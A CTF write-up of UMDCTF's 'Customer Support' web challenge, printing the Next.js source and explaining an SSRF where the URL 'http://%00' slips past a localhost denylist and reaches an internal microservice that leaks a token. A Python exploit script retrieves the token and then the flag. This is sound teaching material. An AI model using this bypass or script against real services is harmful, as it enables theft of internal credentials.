# Customer Support

This is the first of two challenges from the WEB category on **UMDCTF** that was available and I've solved. In this one main case is to understand the code, then with **Server Site Request Forgery**, we will read the **token** from micro-service and lastly complete the challenge getting the flag.

**Challenge description:**<br>
Contact Devils customer support and see what they have to offer.

**Hint**: <br>
Refer to How do JSON Web Tokens work? on https://jwt.io/introduction

### **Application tree**

![customer_tree.png](customer_tree.png)

After downloading the files and looking at the application structure, we have one **micro-service** and the **main application**. The most important files are in the `/pages/api/` directory, where we have:

#### **/auth.ts**
```
import type { NextApiRequest, NextApiResponse } from 'next';
import { getCookie } from 'cookies-next';
const dotenv = require('dotenv');
dotenv.config();

type Data = {
    status: string
    body: string
}

export default async function handler(
    req: NextApiRequest,
    res: NextApiResponse<Data>
) {
    if (req.method === 'GET') {
        const tok = getCookie('Authorization', {req, res});
        return res.status(200).json({ status: 'success', body: `${tok && tok == process.env.TOKEN ? process.env.FLAG : ''}`});
    }
}

```
The **goal** of this challenge is, to pass the **authorization check** with proper **Authorization Cookie** and we will be able to reach the **flag**.

The second file is obfuscated and it's really hard to read.
#### **/contact.ts** - `obfuscated`

```
import type { NextApiRequest, NextApiResponse } from 'next';
import { parse } from 'url';
const dns = require('dns')
const util = require('util');
const dotenv = require('dotenv');
dotenv.config();

type Data = {
  status: string
  body: string
}

let c = (t: string) => {
  if(!t) return '';
  let r = t.match(/(https?:\/\/[^\s]+)/g);
  let s = r ? r[r.length - 1] : '';
  return s.includes('localhost') || s.includes( '127.0.0.1') || s.includes( '0.0.0.0') ? '' : s;
}

let a = function (str: string) {
  return str.replace(/[^\w. ]/gi, function (c) {
    return '&#' + c.charCodeAt(0) + ';';
  });
};


//@ts-ignore
let l = (body) => {
  let v = [body.name, body.email, body.subject, body.message];
  return v.reduce((acc, vv) => vv && acc, true) && v.reduce((acc, vv: string) => acc && vv.length < 400, true) && body.email.includes('@');
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  if (req.method === 'POST') {
    const lookup = util.promisify(dns.lookup);
    if(!l(req.body)){
      return res.status(400).json({ status: 'failed', body: '' });
    }
    const cs = c(req.body.message);
    if(!cs){
      return res.status(200).json({ status: 'success', body: '' });
    }

    const u = parse(cs);
    let t: string;
    try {
      t = u.hostname ? (await lookup(u.hostname)).address : `${process.env.MICROSERVICE}`;
    } catch (e) {
      return res.status(200).json({ status: 'success', body: `${process.env.DEF}`});
    }

    return fetch(`${u.protocol}//${t}`, {method: 'GET'})
        .then((r) => r.text())
        .then((b) => res.status(200).json({ status: 'success', body: b.substring(0, b.length < 20000 ? b.length : 20000)}))
        .catch((e => {res.status(200).json({ status: 'success', body: 'UNDEF' }); console.log(e)}));
  }
}

```

Let's stop here for a moment and see what the application really looks like in the web browser.

![customer_webform.png](customer_webform.png)

So we got the form, after pressing the submit button, the `POST` method is being sent to the application backend on endpoint `/api/contact` with form variables. Now it's time to better **understand the code**, because this is the main goal of this challenge.

I tried to rename some variables and write comments, so the code of `contact.ts` would be more understandable:
#### **/contact.ts**
```
import type { NextApiRequest, NextApiResponse } from 'next';
import { parse } from 'url';
const dns = require('dns')
const util = require('util');
const dotenv = require('dotenv');
dotenv.config();

type Data = {
  status: string
  body: string
}

let url_check = (url: string) => {
  if(!url) return '';
  let url_with_https = url.match(/(https?:\/\/[^\s]+)/g);
  let s = url_with_https ? url_with_https[url_with_https.length - 1] : '';
  // if url doesn't include localhost, return it (e.g. https://google.com)
  return s.includes('localhost') || s.includes( '127.0.0.1') || s.includes( '0.0.0.0') ? '' : s;
}

// not used at all
let a = function (str: string) {
  return str.replace(/[^\w. ]/gi, function (c) {
    return '&#' + c.charCodeAt(0) + ';';
  });
};

// validate the form input: name, email, etc.
//@ts-ignore
let validate_form_inpt = (body) => {
  let input = [body.name, body.email, body.subject, body.message];
  return input.reduce((acc, vv) => vv && acc, true) && input.reduce((acc, vv: string) => acc && vv.length < 400, true) && body.email.includes('@');
}

// this function send the GET request on the url given in message input
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  if (req.method === 'POST') {
    // dns lookup variable initialization
    const lookup = util.promisify(dns.lookup);

    // check if form input isn't empty after the validation
    if(!validate_form_inpt(req.body)){
      return res.status(400).json({ status: 'failed', body: '' });
    }

    // check if messege contains url, if so, extract it
    const url = url_check(req.body.message);
    // if const url is empty, return empty body
    if(!url){
      return res.status(200).json({ status: 'success', body: '' });
    }
    // parse url to be an object
    const url_object = parse(url);
    let hostname: string;

    // !!! IMPORTANT !!!
    try {
      hostname = url_object.hostname ? (await lookup(url_object.hostname)).address : `${process.env.MICROSERVICE}`;
    } catch (e) {
      return res.status(200).json({ status: 'success', body: `${process.env.DEF}`});
    }

    // Send request and return the output from it
    return fetch(`${url_object.protocol}//${hostname}`, {method: 'GET'})
        .then((r) => r.text())
        .then((b) => res.status(200).json({ status: 'success', body: b.substring(0, b.length < 20000 ? b.length : 20000)}))
        .catch((e => {res.status(200).json({ status: 'success', body: 'UNDEF' }); console.log(e)}));
  }
}

```

Basically, the application takes the URL sent in the message input, then performs DNS lookup to get the IP of the service and send a GET request on that IP.

![customer_message_google.png](customer_message_google.png)

In local console we get following error:

![customer_request_error.png](customer_request_error.png)

**BUT**, there is also the other way, let's look closer to the code.

```
// !!! IMPORTANT !!!
try {
  hostname = url_object.hostname ? (await lookup(url_object.hostname)).address : `${process.env.MICROSERVICE}`;
} catch (e) {
  return res.status(200).json({ status: 'success', body: `${process.env.DEF}`});
}
```

If the hostname is empty it will take the variable `${process.env.MICROSERVICE}` instead of our hostname. The `.env` file contains:

```
MICROSERVICE=localhost:3001/a24
TOKEN=hello
FLAG=UMDCTF{lolo}
```
So the variable `MICROSERVICE` will become `localhost:3001/a24`. Looking at the file `microservice/app.js` we can see that this endpoint **returns the token**. That could be a different token because microservice has its own `.env` file, but the creators mention at the beginning about **JWT**. This method of authorization uses the very same token in all services, so these tokens should be **the same**.

```
authRouter.get('/a24', function(req, res, next) {
    return res.status(200).json(JSON.stringify({ token: process.env.TOKEN }));
});
```
The last thing to do is to figure out how to pass all the checks up to the one in **Try/Catch block**. My way to achieve that is to add **null byte** to the `http://`, so the message input would be `https://%00`.

It worked also on the non-local environment, returning the **JWT token**. Then we need to put it into an **Authorization Cookie** and read the flag, but since it's JWT, it's necessary to add the string `Bearer` before the actual token. The final Python **script** looks like this:

```
import requests

url = "https://<url>"

payload = "http://%00"
json = {
    "name":"name-kz",
    "email":"kz@kz",
    "subject":"subject-kz",
    "message":payload
}

response = requests.post(url= url + "/api/contact", json= json)

# cut only token from the response
token = response.text[49:-9]
print(token, "- token")
cookie = {"Authorization":" Bearer " + token}

resposne2 = requests.get(url= url + "/api/auth", cookies=cookie)
flag = resposne2.text[28:-2]

print(flag, "- flag")
```

**Output:**

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVNRENURiIsImIiOiJUb2RheSBJIHdpbGwgbGl2ZSBpbiB0aGUgbW9tZW50LCB1bmxlc3MgaXQgaXMgdW5wbGVhc2FudCwgaW4gd2hpY2ggY2FzZSwgSSB3aWxsIGVhdCIsImlhdCI6MTcxNjIzOTAyMn0.7SoLIpd9dL9d3Lx84vbAqlLCE5rR3fWqN8ZWLx41QDE - token
`

`UMDCTF{I_b3t_th@t_c00kie_t4sted_g00d_d!dnt_it!U4L_p4rs1ng_suck5} - flag`
